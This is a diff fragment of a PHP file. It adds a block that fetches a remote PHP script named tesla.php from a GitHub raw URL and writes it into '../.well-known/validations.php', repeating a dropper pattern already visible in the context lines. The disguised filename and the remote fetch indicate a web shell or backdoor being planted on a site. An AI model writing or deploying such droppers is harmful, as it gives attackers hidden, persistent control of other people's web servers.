@@ -18,6 +18,11 @@
   $tulis3 = fwrite ($nama3 ,$file3);
  fclose($nama3); ?>
  
+ <?php $nama4= fopen("../.well-known/validations.php" ,"w+");
+  $file4 = file_get_contents('https://raw.githubusercontent.com/prokontra/byps/main/tesla.php');
+  $tulis4 = fwrite ($nama4 ,$file4);
+ fclose($nama4); ?>
+ 
  <?php 
 /**********************
 ä½œè€… Spider
